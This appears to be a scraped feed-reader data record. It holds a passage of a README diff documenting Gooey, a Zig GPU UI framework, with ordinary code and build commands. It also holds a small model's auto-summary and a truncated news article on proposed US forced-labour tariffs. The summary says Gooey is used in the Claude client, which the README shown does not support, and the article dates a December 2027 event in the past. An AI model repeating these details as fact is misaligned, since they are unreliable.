+    const s = cx.stateConst(State);
+    const msg = s.messages[index];
+    const height: f32 = if (msg.has_image) 120.0 else 48.0;
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .height = height,
+        .on_click_handler = cx.updateWith(index, State.selectMessage),
+    }, .{
+        ui.text(msg.text, .{}),
+    }));
+
+    return height; // Return actual rendered height for caching
+}
+Accurate Height Estimation with measureText
+Instead of hardcoding heights or guessing character widths, use cx.measureText() to get pixel-accurate dimensions from the platform text shaper (CoreText/HarfBuzz/browser):
+fn renderMessage(index: u32, cx: *Cx) f32 {
+    const s = cx.stateConst(State);
+    const msg = s.messages[index];
+    const padding: f32 = 32.0;
+    const max_bubble_width: f32 = 400.0;
+
+    // Measure with wrapping — uses the real shaper so kerning matches rendering
+    const m = cx.measureText(msg.text, .{
+        .max_width = max_bubble_width,
+        .font_size = 15,        // null = use the current font size
+    }) catch |_| TextMeasurement{ .width = 0, .height = 48, .line_count = 1 };
+
+    const height = m.height + padding;
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .height = height,
+    }, .{
+        ui.text(msg.text, .{ .size = 15, .wrap = .word }),
+    }));
+
+    return height;
+}
+measureText returns a TextMeasurement with .width, .height, and .line_count.
+DataTable
+Virtualized 2D table with both vertical and horizontal virtualization. Supports column resizing, sorting, and selection. Uses a callbacks struct for header and cell rendering.
+const State = struct {
+    table_state: DataTableState = blk: {
+        var t = DataTableState.init(10_000, 32.0); // row count, row height
+        t.addColumn(.{ .width_px = 80, .sortable = true }) catch unreachable;   // ID
+        t.addColumn(.{ .width_px = 200, .sortable = true }) catch unreachable;  // Name
+        t.addColumn(.{ .width_px = 100 }) catch unreachable;                     // Status
+        break :blk t;
+    },
+
+    pub fn onHeaderClick(self: *State, col: u32) void {
+        _ = self.table_state.toggleSort(col);
+        // Re-sort your data based on table_state.sort_column and direction
+    }
+
+    pub fn onRowClick(self: *State, row: u32) void {
+        self.table_state.selection.row = row;
+    }
+};
+
+// In render function:
+fn render(cx: *Cx) void {
+    const s = cx.state(State);
+    const theme = cx.theme();
+    cx.dataTable("my-table", &s.table_state, .{
+        .fill_width = true,
+        .grow_height = true,
+        .row_hover_background = theme.overlay,
+        .row_selected_background = theme.primary,
+    }, .{
+        .render_header = renderHeader,
+        .render_cell = renderCell,
+    });
+}
+
+fn renderHeader(col: u32, cx: *Cx) void {
+    const s = cx.stateConst(State);
+    const theme = cx.theme();
+
+    // Add sort indicator if this column is sorted
+    const name = COLUMN_NAMES[col];
+    const label = if (s.table_state.sort_column == col)
+        if (s.table_state.sort_direction == .ascending) name ++ " ▲" else name ++ " ▼"
+    else
+        name;
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .fill_height = true,
+        .on_click_handler = cx.updateWith(col, State.onHeaderClick),
+    }, .{
+        ui.text(label, .{ .weight = .semibold, .color = theme.text }),
+    }));
+}
+
+fn renderCell(row: u32, col: u32, cx: *Cx) void {
+    const theme = cx.theme();
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .fill_height = true,
+        .padding = .{ .symmetric = .{ .x = 8, .y = 0 } },
+    }, .{
+        switch (col) {
+            0 => ui.textFmt("{d}", .{row}, .{ .color = theme.text }),
+            1 => ui.text(data[row].name, .{ .color = theme.text }),
+            2 => ui.text(data[row].status, .{ .color = theme.text }),
+            else => ui.text("—", .{}),
+        },
+    }));
+}
+Form Validation
+Gooey provides utilities for form validation with touched-state tracking:
+Validation Utilities
+const validation = gooey.validation;
+
+// Single validators
+const err = validation.required(value);           // Non-empty check
+const err = validation.email(value);              // Email format
+const err = validation.minLength(value, 8);       // Minimum length
+const err = validation.maxLength(value, 100);     // Maximum length
+const err = validation.numeric(value);            // Digits only
+const err = validation.alphanumeric(value);       // Letters and numbers
+const err = validation.matches(value, other);     // Values must match
+
+// Password strength
+const err = validation.hasUppercase(value);       // At least one uppercase
+const err = validation.hasLowercase(value);       // At least one lowercase
+const err = validation.hasDigit(value);           // At least one number
+const err = validation.hasSpecialChar(value);     // At least one special char
+
+// Chain multiple validators - returns first error or null
+const err = validation.all(password, .{
+    validation.required,
+    validation.minLengthValidator(8),
+    validation.hasUppercase,
+    validation.hasDigit,
+});
+Custom Messages (i18n)
+Create validators with custom messages for internationalization:
+// Define a locale struct with custom validators
+const french = struct {
+    pub const required = validation.requiredMsg("Ce champ est requis");
+    pub const email = validation.emailMsg("Adresse e-mail invalide");
+    pub const minLength8 = validation.minLengthMsg(8, "Au moins 8 caractères");
+    pub const hasUppercase = validation.hasUppercaseMsg("Au moins une majuscule");
+};
+
+// Use in validation - works with all() combinator
+const err = validation.all(value, .{
+    french.required,
+    french.email,
+});
+
+// Available message factories:
+// validation.requiredMsg(msg)
+// validation.emailMsg(msg)
+// validation.minLengthMsg(min, msg)
+// validation.maxLengthMsg(max, msg)
+// validation.numericMsg(msg)
+// validation.alphanumericMsg(msg)
+// validation.hasUppercaseMsg(msg)
+// validation.hasLowercaseMsg(msg)
+// validation.hasDigitMsg(msg)
+// validation.hasSpecialCharMsg(msg)
+// validation.matchesMsg(msg)
+Error Codes (Programmatic Handling)
+Use error codes when you need to programmatically handle errors (e.g., focus first invalid field):
+// Returns ?ErrorCode instead of ?[]const u8
+const code = validation.requiredCode(value);
+if (code == .required) {
+    cx.setFocus("username");  // Focus first invalid field
+}
+
+// Available error codes:
+// .required, .min_length, .max_length, .invalid_email,
+// .not_numeric, .not_alphanumeric, .mismatch,
+// .no_uppercase, .no_lowercase, .no_digit, .no_special_char
+
+// Find first invalid field - call individual *Code functions in sequence
+// (there's no allCode() combinator; this pattern keeps the API simple)
+pub fn getFirstInvalidField(s: *const State) ?[]const u8 {
+    if (validation.requiredCode(s.username) != null) return "username";
+    if (validation.emailCode(s.email) != null) return "email";
+    if (validation.minLengthCode(s.password, 8) != null) return "password";
+    return null;
+}
+
+Note: Unlike all() for error messages, there's no allCode() combinator.
+For multi-field validation with error codes, call individual *Code functions
+in sequence as shown above. This keeps the API simple while covering the
+common "focus first invalid field" use case.
+
+Structured Results (Full Accessibility Control)
+When you need different messages for visual display vs screen readers:
+// Structured result with separate messages
+const result = validation.requiredResult(value, .{
+    .message = "Required",  // Terse for visual display
+    .accessible_message = "The email field is required. Please enter your email address.",
+});
+
+if (result) |r| {
+    r.code              // ErrorCode for programmatic handling
+    r.displayMessage()  // Message for visual display
+    r.screenReaderMessage()  // Message for screen readers (falls back to display)
+}
+
+// Use with ValidatedTextInput for full a11y control
+gooey.ValidatedTextInput{
+    .id = "email",
+    .error_result = validation.requiredResult(s.email, .{
+        .message = "Required",
+        .accessible_message = "The email address field is required",
+    }),
+    .show_error = s.touched_email,
+}
+ValidatedTextInput Component
+All-in-one form field with label, input, error display, and help text:
+const State = struct {
+    email: []const u8 = "",
+    touched_email: bool = false,
+
+    pub fn validateEmail(self: *const State) ?[]const u8 {
+        return gooey.validation.all(self.email, .{
+            gooey.validation.required,
+            gooey.validation.email,
+        });
+    }
+
+    pub fn onEmailBlur(self: *State) void {
+        self.touched_email = true;
+    }
+};
+
+// In render:
+gooey.ValidatedTextInput{
+    .id = "email",
+    .label = "Email Address",
+    .required_indicator = true,        // Shows "*" after label
+    .placeholder = "you@example.com",
+    .bind = &s.email,
+    .error_message = s.validateEmail(),  // Simple string error
+    .show_error = s.touched_email,       // Only show after interaction
+    .help_text = "We'll never share your email",
+    .on_blur_handler = cx.update(State.onEmailBlur),
+    .width = 300,
+}
+
+// Or with structured result for different a11y messages:
+gooey.ValidatedTextInput{
+    .id = "email",
+    .label = "Email Address",
+    .error_result = validation.emailResult(s.email, .{
+        .message = "Invalid email",
+        .accessible_message = "Please enter a valid email address in the format name@example.com",
+    }),
+    .show_error = s.touched_email,
+}
+Form-Level Helpers
+// Track errors for multiple fields
+var errors = validation.FormErrors(4).init();
+errors.set(0, validation.required(s.username));
+errors.set(1, validation.email(s.email));
+errors.set(2, validation.minLength(s.password, 8));
+errors.set(3, validation.matches(s.confirm, s.password));
+
+if (errors.isValid()) {
+    // Submit form
+} else {
+    // errors.firstErrorIndex() returns index of first invalid field
+}
+
+// Track touched state
+var touched = validation.TouchedFields(4).init();
+touched.touch(0);  // Mark field 0 as touched
+if (touched.isTouched(0)) { ... }
+touched.touchAll();  // Mark all on submit
+touched.reset();     // Clear on form reset
+Run zig build run-form-validation for a complete example.
+Animation System
+Built-in animation support with easing functions:
+// Simple animation (runs once on mount)
+const fade = cx.animate("fade-in", .{ .duration_ms = 500 });
+// fade.progress goes 0.0 -> 1.0
+
+// Animation that restarts when a value changes
+const pulse = cx.animateOn("counter-pulse", s.count, .{
+    .duration_ms = 200,
+    .easing = Easing.easeOutBack,
+});
+
+// Continuous animation
+const spin = cx.animate("spinner", .{
+    .duration_ms = 1000,
+    .mode = .ping_pong,  // or .loop
+});
+
+// Use animation values
+cx.render(ui.box(.{
+    .background = Color.white.withAlpha(fade.progress),
+    .width = gooey.lerp(100.0, 150.0, pulse.progress),
+}, .{...}));
+Available Easings: linear, easeIn, easeOut, easeInOut, easeOutBack, easeOutCubic, easeInOutCubic
+Change Detection
+cx.changed() detects when a value changes between frames — replacing the common pattern of module-level var last_foo: ?T = null with manual diffing:
+// Invalidate caches when dependencies change
+if (cx.changed("dark_mode", s.dark_mode) or cx.changed("window_width", size.width)) {
+    s.invalidateCachedHeights();
+}
+Semantics:
+
+First call for a given key → returns false (no previous value)
+Same value as last frame → returns false
+Different value → returns true (and stores the new value)
+
+Works with any value type: bool, f32, i32, enums, small structs.
+// Theme change
+if (cx.changed("theme", s.theme)) {
+    s.rebuildStyles();
+}
+
+// Window resize (triggers layout recalc)
+const size = cx.windowSize();
+if (cx.changed("width", size.width)) {
+    s.onResize(size.width);
+}
+
+// Enum state
+if (cx.changed("view", s.current_view)) {
+    s.scrollToTop();
+}
+Keys are comptime strings hashed to u32 (same approach as the animation system). Up to 64 tracked values per app.
+File Dialogs
+Cross-platform file open/save dialogs via gooey.file_dialog:
+const file_dialog = gooey.file_dialog;
+
+// Open dialog
+if (file_dialog.promptForPaths(allocator, .{
+    .files = true,
+    .prompt = "Attach",
+    .allowed_extensions = &.{ "txt", "png", "pdf" },
+})) |result| {
+    defer result.deinit();
+    for (result.paths) |path| {
+        // ...
+    }
+}
+
+// Save dialog
+if (file_dialog.promptForNewPath(allocator, .{
+    .suggested_name = "untitled.txt",
+    .prompt = "Save",
+})) |path| {
+    defer allocator.free(path);
+    // ...
+}
+
+macOS: NSOpenPanel / NSSavePanel (blocking)
+Linux: XDG Desktop Portal via D-Bus (blocking)
+WASM: Returns null — use gooey.platform.web.file_dialog for the async callback API
+
+Use file_dialog.supported (comptime bool) for feature detection. File dialogs block the thread, so call them from a deferred command to avoid deadlocks during event handling.
+Entity System
+Dynamic creation and deletion with automatic cleanup:
+const Counter = struct {
+    count: i32 = 0,
+    pub fn increment(self: *Counter) void { self.count += 1; }
+};
+
+const AppState = struct {
+    counters: [10]gooey.Entity(Counter) = ...,
+
+    // Command method - needs Gooey access for entity operations
+    pub fn addCounter(self: *AppState, g: *gooey.Gooey) void {
+        const entity = g.createEntity(Counter, .{ .count = 0 }) catch return;
+        self.counters[self.counter_count] = entity;
+        self.counter_count += 1;
+    }
+};
+
+// In render - use entityCx for entity-scoped handlers
+var entity_cx = cx.entityCx(Counter, counter_entity) orelse return;
+Button{ .label = "+", .on_click_handler = entity_cx.update(Counter.increment) }
+
+// Read entity data
+if (cx.gooey().readEntity(Counter, entity)) |data| {
+    ui.textFmt("{d}", .{data.count}, .{});
+}
+Layout System
+Flexbox-inspired layout with shrink behavior and text wrapping:
+cx.render(ui.box(.{
+    .direction = .row,           // or .column
+    .gap = 16,
+    .padding = .{ .all = 24 },   // or .symmetric, .each
+    .alignment = .{ .main = .space_between, .cross = .center },
+    .fill_width = true,
+    .grow = true,
+}, .{...}));
+
+// Childless boxes — use ui.rect() for dividers, spacers, colored blocks
+ui.rect(.{ .width = 1, .height = 18, .background = t.border })  // divider
+ui.rect(.{ .grow = true })                                       // spacer
+ui.rect(.{ .width = 40, .height = 40, .background = color, .corner_radius = 4 })
+
+// Shrink behavior - elements shrink when container is too small
+cx.render(ui.box(.{ .width = 150, .min_width = 60 }, .{...}));
+
+// Text wrapping
+ui.text("Long text...", .{ .wrap = .words });  // .none, .words, .newlines
+Custom Shaders
+Add custom post-processing shaders for visual effects. Shaders are cross-platform with MSL for macOS and WGSL for web:
+// MSL shader (macOS)
+pub const plasma_msl =
+    \\\\void mainImage(thread float4& fragColor, float2 fragCoord,
+    \\\\               constant ShaderUniforms& uniforms,
+    \\\\               texture2d<float> iChannel0,
+    \\\\               sampler iChannel0Sampler) {
+    \\\\    float2 uv = fragCoord / uniforms.iResolution.xy;
+    \\\\    float time = uniforms.iTime;
+    \\\\    // ... shader code
+    \\\\    fragColor = float4(color, 1.0);
+    \\\\}
+;
+
+// WGSL shader (Web)
+pub const plasma_wgsl =
+    \\\\fn mainImage(
+    \\\\    fragCoord: vec2<f32>,
+    \\\\    u: ShaderUniforms,
+    \\\\    tex: texture_2d<f32>,
+    \\\\    samp: sampler
+    \\\\) -> vec4<f32> {
+    \\\\    let uv = fragCoord / u.iResolution.xy;
+    \\\\    let time = u.iTime;
+    \\\\    // ... shader code
+    \\\\    return vec4<f32>(color, 1.0);
+    \\\\}
+;
+
+try gooey.runCx(AppState, &state, render, .{
+    .custom_shaders = &.{.{ .msl = plasma_msl, .wgsl = plasma_wgsl }},
+});
+You can also provide only one platform's shader:
+// macOS only
+.custom_shaders = &.{.{ .msl = plasma_msl }},
+
+// Web only
+.custom_shaders = &.{.{ .wgsl = plasma_wgsl }},
+Glass Effect (macOS 26.0+)
+Transparent window with liquid glass effect:
+try gooey.runCx(AppState, &state, render, .{
+    .title = "Glass Demo",
+    .background_color = gooey.Color.rgba(0.1, 0.1, 0.15, 1.0),
+    .background_opacity = 0.2,
+    .glass_style = .glass_regular,  // .glass_clear, .blur, .none
+    .glass_corner_radius = 10.0,
+    .titlebar_transparent = true,
+});
+
+// Change glass style at runtime
+pub fn cycleStyle(self: *AppState, g: *gooey.Gooey) void {
+    g.window.setGlassStyle(.glass_clear, 0.7, 10.0);
+}
+Actions & Keybindings
+Contextual action system with keyboard shortcuts:
+const Undo = struct {};
+const Save = struct {};
+
+fn setupKeymap(cx: *Cx) void {
+    const g = cx.gooey();
+    g.keymap.bind(Undo, "cmd-z", null);        // Global
+    g.keymap.bind(Save, "cmd-s", "Editor");    // Context-specific
+}
+
+fn render(cx: *Cx) void {
+    cx.render(ui.box(.{}, .{
+        ui.onAction(Undo, doUndo),  // Handle action
+
+        // Scoped context
+        ui.keyContext("Editor"),
+        ui.onAction(Save, doSave),
+    }));
+}
+Quitting the App
+Use g.quit() from a cx.command() handler to quit portably across macOS, Linux, and WASM (no-op).
+Both ui.onActionHandler and Button.on_click_handler accept a HandlerRef, so the same cx.command() handler works for both the keybinding and the button:
+const QuitApp = struct {};
+
+const AppState = struct {
+    initialized: bool = false,
+
+    fn quitApp(_: *AppState, g: *gooey.Gooey) void {
+        g.quit();
+    }
+};
+
+fn setupKeymap(cx: *Cx) void {
+    const s = cx.state(AppState);
+    if (s.initialized) return;
+    s.initialized = true;
+
+    cx.gooey().keymap.bind(QuitApp, "cmd-q", null);
+}
+
+fn render(cx: *Cx) void {
+    setupKeymap(cx);
+
+    const quit_handler = cx.command(AppState.quitApp);
+
+    cx.render(ui.box(.{ .padding = .{ .all = 24 }, .gap = 16 }, .{
+        // cmd+q triggers quitApp via the action system
+        ui.onActionHandler(QuitApp, quit_handler),
+
+        // Button triggers the same handler on click
+        Button{
+            .label = "Quit",
+            .variant = .danger,
+            .on_click_handler = quit_handler,
+        },
+    }));
+}
+More Examples
+
+
+
+Example
+Command
+Description
+
+
+
+
+Showcase
+zig build run
+Full feature demo with navigation
+
+
+Counter
+zig build run-counter
+Simple state management
+
+
+Animation
+zig build run-animation
+Animation system with animateOn
+
+
+Pomodoro
+zig build run-pomodoro
+Timer with tasks and custom shader
+
+
+Dynamic Counters
+zig build run-dynamic-counters
+Entity creation and deletion
+
+
+Layout
+zig build run-layout
+Flexbox, shrink, text wrapping
+
+
+Glass
+zig build run-glass
+Liquid glass transparency effect
+
+
+Spaceship
+zig build run-spaceship
+Sci-fi dashboard with hologram shader
+
+
+Actions
+zig build run-actions
+Keybindings and action system
+
+
+Select
+zig build run-select
+Dropdown select component
+
+
+Tooltip
+zig build run-tooltip
+Tooltip positioning and styling
+
+
+Modal
+zig build run-modal
+Modal dialogs with animation
+
+
+Images
+zig build run-images
+Image loading and effects
+
+
+File Dialog
+zig build run-file-dialog
+Native file open/save dialogs
+
+
+A11y Demo
+zig build run-a11y-demo
+VoiceOver accessibility demo
+
+
+Accessible Form
+zig build run-accessible-form
+Complete accessible form example
+
+
+Drag & Drop
+zig build run-drag-drop
+Draggable items and drop targets
+
+
+Uniform List
+zig build run-uniform-list
+Virtualized list with 10,000 items
+
+
+Virtual List
+zig build run-virtual-list
+Variable-height virtualized list
+
+
+Data Table
+zig build run-data-table
+Virtualized table with 10,000 rows
+
+
+Code Editor
+zig build run-code-editor
+Code editor with syntax highlighting
+
+
+
+See docs/accessibility.md for comprehensive accessibility documentation.
+Logging
+Two options for cross-platform logging (native + WASM):
+Option A: gooey.std_options — one-liner for std.log compatibility:
+const gooey = @import("gooey");
+
+// Routes std.log through console.log on WASM, default on native
+pub const std_options = gooey.std_options;
+Option B: gooey.log — zero-config, no std_options needed:
+const log = gooey.log.scoped(.myapp);
+
+log.info("connected to {s}", .{host});
+log.err("request failed: {}", .{code});
+On native, gooey.log delegates to std.log.scoped(). On WASM, it writes directly to the browser console. Use option A if you need third-party libraries to log through std.log. Use option B if you just want logging that works everywhere.
+WASM
+
+⚠️ Temporarily deferred on Zig 0.16.0 (upstream Io.Threaded).
+std.Io.Threaded does not compile for wasm32-freestanding on Zig 0.16.0 —
+its comptime body eagerly references posix.system.getrandom and
+posix.IOV_MAX, which resolve to void/absent on that target. This is an
+upstream issue, not a Gooey one. The zig build wasm* steps have been removed
+from build.zig (the commands no longer exist), while the web code paths
+(src/platform/web/, WebApp in app.zig, and src/examples/*_wasm.zig) are
+deliberately left in place to resume compiling once upstream gates those
+references. Tracking: docs/zig-0.16-io-migration.md.
+
+Once the upstream fix lands, the WASM build steps will be restored. The commands
+below are the intended interface — currently inactive:
+# (currently disabled — see the note above)
+# zig build wasm                 # showcase
+# zig build wasm-counter
+# zig build wasm-dynamic-counters
+# zig build wasm-pomodoro
+# zig build wasm-spaceship
+# zig build wasm-layout
+# zig build wasm-select
+# zig build wasm-tooltip
+# zig build wasm-modal
+# zig build wasm-images
+# zig build wasm-file-dialog
+
+# Run with a local server
+# python3 -m http.server 8080 -d zig-out/web
+Hot Reloading (macOS)
+Simple brute-force hot reload for development:
+zig build hot                    # Showcase (default)
+zig build hot -- run-counter     # Specific example
+zig build hot -- run-pomodoro
+zig build hot -- run-glass
+Architecture
+src/
+├── app.zig          # App entry points (runCx, App, WebApp)
+├── cx.zig           # Unified context (Cx)
+├── root.zig         # Public API exports
+│
+├── core/            # Foundational types (geometry, events, shaders)
+├── input/           # Input handling (events, actions, keymaps)
+├── scene/           # GPU primitives (scene graph, batching)
+├── context/         # App context (focus, entity, dispatch, widget store)
+├── animation/       # Animation system and easing
+├── debug/           # Debugging tools and render stats
+│
+├── ui/              # Declarative builder (box, vstack, hstack, primitives)
+├── components/      # UI components (Button, TextInput, Modal, Tooltip, etc.)
+├── widgets/         # Stateful widget implementations (text input/area state)
+├── layout/          # Flexbox-style layout engine
+│
+├── text/            # Text rendering (CoreText, FreeType/HarfBuzz, Canvas)
+├── image/           # Image loading and atlas management
+├── svg/             # SVG rasterization (CoreGraphics, Linux, Canvas)
+├── platform/        # macOS/Metal, Linux/Vulkan/Wayland, WASM/WebGPU
+├── runtime/         # Frame rendering and input handling
+└── examples/        # Demo applications
+Linux Platform
+Gooey has full Linux support using Wayland and Vulkan. The showcase and all demos run on Linux.
+Architecture
+Linux Platform Stack:
+┌─────────────────────────────────────┐
+│         gooey Application           │
+├─────────────────────────────────────┤
+│  LinuxPlatform  │  Window           │
+│  (event loop)   │  (XDG shell)      │
+├─────────────────────────────────────┤
+│  VulkanRenderer │  SceneRenderer    │
+│  (direct Vulkan, GLSL shaders)      │
+├─────────────────────────────────────┤
+│  Wayland Client  │  Vulkan Driver   │
+└─────────────────────────────────────┘
+What's Implemented ✓
+
+
+
+Feature
+Implementation
+
+
+
+
+Windowing
+Wayland via XDG shell (xdg-toplevel, xdg-decoration)
+
+
+GPU Rendering
+Direct Vulkan with GLSL shaders (unified, text, svg, image pipelines)
+
+
+Text Rendering
+FreeType for rasterization, HarfBuzz for shaping, Fontconfig for font discovery
+
+
+Input Handling
+Full keyboard (evdev keycodes), mouse, scroll with modifier support
+
+
+Clipboard
+Wayland data-device protocol (copy/paste text)
+
+
+File Dialogs
+XDG Desktop Portal via D-Bus (open, save, directory selection)
+
+
+IME Support
+zwp_text_input_v3 protocol for international text input
+
+
+HiDPI
+wp_viewporter protocol with scale factor support
+
+
+Server Decorations
+zxdg-decoration-manager-v1 protocol
+
+
+
+Key Design Decisions
+
+Wayland-only - No X11 fallback (modern approach like Ghostty)
+Direct Vulkan - No wgpu-native dependency, full control over rendering
+Native text stack - FreeType/HarfBuzz/Fontconfig (same as most Linux apps)
+XDG Portal integration - Native file dialogs that respect user's desktop environment
+
+Dependencies Required
+# System packages (Debian/Ubuntu)
+sudo apt install \\
+    libwayland-dev \\
+    libvulkan-dev \\
+    libfreetype-dev \\
+    libharfbuzz-dev \\
+    libfontconfig-dev \\
+    libpng-dev \\
+    libdbus-1-dev
+
+# Fedora/RHEL
+sudo dnf install \\
+    wayland-devel \\
+    vulkan-loader-devel \\
+    freetype-devel \\
+    harfbuzz-devel \\
+    fontconfig-devel \\
+    libpng-devel \\
+    dbus-devel
+
+# Arch Linux
+sudo pacman -S \\
+    wayland \\
+    vulkan-icd-loader \\
+    vulkan-headers \\
+    freetype2 \\
+    harfbuzz \\
+    fontconfig \\
+    libpng \\
+    dbus
+Building & Running
+# Build and run the showcase
+zig build run
+
+# Run specific demos
+zig build run-basic        # Simple Wayland + Vulkan test
+zig build run-text         # Text rendering demo
+zig build run-file-dialog  # XDG portal file dialogs
+
+# Compile shaders (only needed if you modify GLSL sources)
+zig build compile-shaders
+What's Left / Known Limitations
+
+Custom cursors - Cursor theming via wl_cursor not yet implemented
+Hot reloading - macOS-only currently (uses FSEvents)
+Glass effects - macOS-specific (compositor-dependent on Linux)
+Multi-window - Supported in platform but not fully tested
+
+Testing & CI
+Running Tests
+# Run all tests
+zig build test
+
+# Run tests under valgrind (Linux only - detects memory leaks)
+zig build test-valgrind
+
+# Check code formatting
+zig fmt --check src/ charts/
+Continuous Integration
+The project uses GitHub Actions for CI. Every push and pull request runs:
+
+
+
+Job
+Platform
+Description
+
+
+
+
+test-linux
+Ubuntu
+Unit tests on Linux
+
+
+test-macos
+macOS
+Unit tests on macOS
+
+
+build-linux
+Ubuntu
+Build all optimization levels (Debug, ReleaseSafe, ReleaseFast, ReleaseSmall)
+
+
+build-macos
+macOS
+Build all optimization levels
+
+
+build-wasm
+Ubuntu
+WebAssembly targets
+
+
+valgrind
+Ubuntu
+Memory leak detection via valgrind
+
+
+zig-fmt
+Ubuntu
+Code formatting check
+
+
+
+Memory Leak Detection
+Valgrind integration helps catch memory issues early:
+# Run tests with full leak checking
+zig build test-valgrind
+The valgrind.supp file contains suppressions for known false positives from system libraries (Vulkan, Wayland, FreeType, HarfBuzz, etc.).
+Inspiration
+
+GPUI - Zed's GPU UI framework
+Clay - Immediate mode layout
+Ghostty - Zig + Metal terminal`,summary:`• SUMMARY
+• Gooey: A GPU-accelerated UI framework for Zig used in the Anthropic Claude client on macOS and Linux, specifically targeting Metal (macOS) and Wayland/WASM/WebGPU.
+• Features:
+• GPU rendering using Metal (macOS), Vulkan (Linux) with MSAA anti-aliasing (WebGPU/WASM is blocked upstream).
+• Declarative UI with Cx/UI Separation for state, handlers, and focus.`,summary_model:`qwen2.5:0.5b`,image_url:`https://opengraph.githubassets.com/18dca289a74c84bd8815e817c16505d5b6cdfc41d4cdb9eecba14fe173a8a22e/duanebester/gooey`,published_at:1780506747,fetched_at:1780509343,content_hash:`689e3528d52b873b1c7371d36b28b3b67c0e4861c3db34700a6cff1043935ed4`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:36,feed_id:11,guid:`https://www.aljazeera.com/?t=1780500712`,url:`https://www.aljazeera.com/economy/2026/6/3/us-cites-forced-labour-concerns-as-grounds-for-new-tariffs?traffic_source=rss`,title:`US cites forced labour concerns as grounds for new tariffs`,content_html:`<div id="readability-page-1" class="page"><div aria-live="polite" aria-atomic="true"><p>The administration of US President Donald Trump has proposed new tariffs of up to 12.5 percent on imports from 60 economies after determining they had failed to curb trade in goods made with forced labour, an assertion that was rejected by US trading partners.</p><p>The proposal from the Office of the United States Trade Representative (USTR), issued late on Tuesday, comes from a Section 301 unfair trade practices investigation designed to help rebuild US President Donald Trump’s emergency tariffs, struck down by a US Supreme Court decision in February.</p><section><h2>Recommended Stories </h2><span>list of 4 items</span><ul><li><span>list 1 of 4</span><a href="https://www.aljazeera.com/news/2026/6/3/us-artist-sues-fifa-over-destruction-of-dallas-whale-mural-for-world-cup">US artist sues FIFA over destruction of Dallas whale mural for World Cup</a></li><li><span>list 2 of 4</span><a href="https://www.aljazeera.com/video/counting-the-cost/2026/6/3/is-asia-facing-a-new-currency-crisis">Is Asia facing a new currency crisis?</a></li><li><span>list 3 of 4</span><a href="https://www.aljazeera.com/news/2026/6/3/defence-energy-halal-sectors-top-agenda-in-turkiye-indonesia-talks">Turkiye’s top diplomat, Indonesia’s president discuss $10bn trade goal</a></li><li><span>list 4 of 4</span><a href="https://www.aljazeera.com/news/2026/6/3/what-is-the-st-petersburg-forum-putins-economic-outreach-to-the-world">What is the St Petersburg forum, Putin’s economic outreach to the world?</a></li></ul><span>end of list</span></section><p>Despite laws banning them, the products of forced labour are deeply embedded in supply chains across the world. European lawmakers bristle at the accusation that the region is less effective than the US at curbing the trade in such goods, with one describing the US findings as “utterly absurd”. Business leaders said the US move created more confusion for companies.</p><p>The USTR proposed 10 percent additional duties on imports from Canada, Ecuador, the European Union, Indonesia, Mexico, Pakistan, Argentina, Bangladesh, Cambodia, El Salvador, Guatemala, Malaysia, Taiwan and Britain. The USTR said all had plans or partial schemes in place.</p><p>The trade agency said it would impose additional duties of 12.5 percent on the remaining 45 countries that it investigated. These include China, India, Nigeria, Japan, South Korea, Vietnam, Australia and New Zealand.</p><p>“The failure of our most important trading partners to address the importation of goods made with forced labour is unacceptable,” US Trade Representative Jamieson Greer said in a statement. “This creates a dynamic where American workers are forced to compete globally on an unlevel playing field.”</p><p>The USTR said it would accept public comments on the proposed tariffs and other remedies through July 6, with a public hearing scheduled for July 7.</p><p>The announcement comes ahead of the July 24 expiration of a <a href="https://www.aljazeera.com/news/2026/2/20/us-president-trump-promises-new-tariffs-slams-supreme-court-decision" rel="noopener" target="_blank">10 percent temporary tariff</a> imposed by the Trump administration on February 20, the day the Supreme Court struck down Trump’s tariffs under the International Emergency Economic Powers Act. It also shows how determined the Trump administration is about building a wall of tariffs around the US economy, the world’s largest, despite repeated setbacks in court.</p><p>After the loss in the Supreme Court, Trump turned to another law to impose temporary 10 percent tariffs globally. But those stopgap levies expire July 24. And a specialised trade court ruled last month that they, too, were <a href="https://www.aljazeera.com/economy/2026/5/7/us-trade-court-rules-against-trumps-10-percent-global-tariffs" rel="noopener" target="_blank">illegal\xA0</a>– though the government can <a href="https://www.aljazeera.com/economy/2026/5/12/us-court-pauses-decision-blocking-trumps-10-percent-global-tariff" rel="noopener" target="_blank">continue collecting</a> them while that case works its way through the courts.</p><h2 id="unjustified-tariffs">Unjustified tariffs</h2><p>The European Commission said the tariffs were unjustified and\xA0reiterated its commitment\xA0to the trade deal sealed with Washington last year.</p><p>Bernd Lange, the chair of the European Parliament’s trade committee, which\xA0voted on Tuesday to accept that trade deal, said the new tariffs were expected, but said the results of the US investigation were still “utterly absurd” given a 2024 EU law to ban imports of forced labour products.</p><p>“The impression is increasingly emerging that a tariff measure is sought first, and only then is a suitable legal justification found,” he said. However, he added that the key question would be whether the additional tariffs would exceed those\xA0agreed\xA0between both sides last July.</p><p>The US’s largest trading partner, the EU, agreed last July to accept tariffs of 15 percent on a broad range of its exports. In its report, the USTR said the EU anti-forced labour measures only came into force in December 2027 and lacked key elements.</p><p>It was unclear whether the proposed tariffs – which the US release described as “additional duties” – would come on top of levies agreed in bilateral deals signed with the US.</p><p>Britain said it was in regular talks with the US and was taking action to tackle forced labour. It added that the preferential access to US markets that it had negotiated for UK businesses remained in place.</p><p>Mexico said that goods that were compliant under the United States-Mexico-Canada Agreement (USMCA) would be exempt from the new tariffs.</p><p>Taiwan said it was\xA0“hopeful and confident”\xA0that the final results would reflect agreements already reached, securing relatively preferential treatment.</p><p>Beijing, facing 12.5 percent tariffs, said that it opposed all forms of unilateral tariffs and that there was no forced labour in China.\xA0India, confronted with the same rate, said it was engaged with Washington on the Section 301 proceedings, noting the proposed tariffs were not final.</p><p>“There will be deep concerns in the international business community that the US [forced labour law could] become a global template,” said Andrew Wilson, deputy secretary general of the International Chamber of Commerce.</p><p>“Anyone can make a claim, get a shipment impounded and the company has to prove no forced labour in supply chain.”</p><h2 id="certain-exemptions">Certain exemptions</h2><p>The USTR said it would exempt from tariffs products including energy, rare earths and some other metals, beef, coffee, certain fruits and vegetables, pharmaceuticals, organic chemicals and aircraft parts.</p><p>It also said it was proposing a textile mechanism that would allow for a certain volume of apparel and textile imports to enter the US at a reduced tariff rate, without giving details.</p><p>The ICC’s Wilson 